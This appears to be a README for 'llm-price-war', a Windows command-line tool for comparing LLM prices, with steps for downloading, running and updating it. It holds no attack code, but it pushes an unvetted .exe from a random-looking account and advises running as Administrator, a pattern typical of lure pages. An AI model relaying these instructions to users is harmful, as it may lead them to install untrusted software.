# ⚔️ llm-price-war - Compare LLM Prices Easily

[![Download llm-price-war](https://img.shields.io/badge/Download-llm--price--war-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/septetbeachwormwood289/llm-price-war)

---

## ℹ️ About llm-price-war

llm-price-war lets you compare prices for over 36 large language models (LLMs) from 12 different providers. It runs on your Windows computer as a simple command-line tool. Use it to find the best cost options before using an LLM. The tool stays up to date with community contributions.

Key points:
- Compare real pricing from many AI service providers.
- Includes popular models like GPT, Anthropic Claude, Gemini, and more.
- Helps plan cost optimization for your AI projects.
- Runs from your command prompt, no programming needed.
- Community-maintained with regular updates.

## 🛠️ System Requirements

Before you install, make sure your Windows PC meets these requirements:

- Windows 10 or later (64-bit recommended)
- At least 2 GB of free disk space
- Internet connection to download and update pricing data
- Basic familiarity with opening and typing commands in Command Prompt (full instructions below)

## 🚀 Getting Started

Getting llm-price-war set up on your Windows machine involves downloading the tool and running it from the command prompt. Follow these steps carefully.

### 1. Download the Application

Click this link or the badge above to visit the download page:

[Download llm-price-war from GitHub](https://github.com/septetbeachwormwood289/llm-price-war)

On the page, look for the latest release under the "Releases" section. Download the Windows executable file (`llm-price-war.exe`) or the ZIP archive containing the program.

### 2. Extract the Files (If Needed)

If you downloaded a ZIP file, right-click on it and select "Extract All...". Choose a folder where you can easily find the program later, such as `Downloads\llm-price-war`.

### 3. Open Command Prompt

- Press `Win + R` on your keyboard.
- Type `cmd` and hit Enter.
- A black window called Command Prompt will open.

### 4. Navigate to the Program Folder

Use the `cd` command to change directories. For example:

```
cd C:\Users\YourName\Downloads\llm-price-war
```

Replace `YourName` with your actual Windows username, and adjust the path to where you saved or extracted the files.

### 5. Run the Program

Type this exact command and press Enter:

```
llm-price-war.exe
```

The program will start. It might show a list of models, providers, and pricing options right in the command window.

## 💡 How to Use the Tool

Once running, you can use several commands to explore prices and compare models:

- **View all models:** Enter `list models`
- **View providers:** Enter `list providers`
- **Calculate cost:** Enter `calculate <model_name> <usage_amount>`

For example, to estimate the cost of 1000 tokens on GPT-4, you would type:

```
calculate gpt-4 1000
```

The program will output the total price, helping you decide which model fits your budget.

## 🔄 Updating Pricing Data

Prices can change often. To keep data current, run the update command:

```
update
```

This downloads the latest pricing info for all supported providers and models.

## 📂 Where Files Are Stored

By default, llm-price-war stores downloaded data and user preferences in:

```
C:\Users\YourName\AppData\Local\llm-price-war\
```

You do not need to change this unless you want to manage storage space.

## ✔️ Troubleshooting

- **Program not found:** Make sure you are in the folder where `llm-price-war.exe` is saved.
- **Permission errors:** Run Command Prompt as Administrator by right-clicking on its icon and selecting "Run as administrator".
- **Internet issues:** Ensure your PC is connected to the internet during updates or first runs.
- **Unrecognized command:** Use simple commands as shown above. The program will provide help if you type `help`.

## 📖 Additional Tips

- Feel free to run `help` in the command prompt after starting the app to see all available commands.
- You can redirect output to a file by using this syntax:

```
llm-price-war.exe > output.txt
```

- Share pricing reports with your team by sending them the saved text files.

---

[![Download llm-price-war](https://img.shields.io/badge/Download-llm--price--war-ff6f61?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/septetbeachwormwood289/llm-price-war)

---

## 🔗 Repository Information

**Repository Name:** llm-price-war  
**Description:** The most comprehensive LLM pricing comparison. 36+ models, 12 providers, CLI calculator. Community-maintained.  
**Topics:** ai, anthropic, claude, comparison, cost-optimization, deepseek, gemini, gpt, llm, llm-pricing, openai, pricing

---

## 📞 Support and Community

This tool is community-maintained. You can submit issues or feature requests on the GitHub repository page. Check the discussions tab to join conversations or find tips from other users.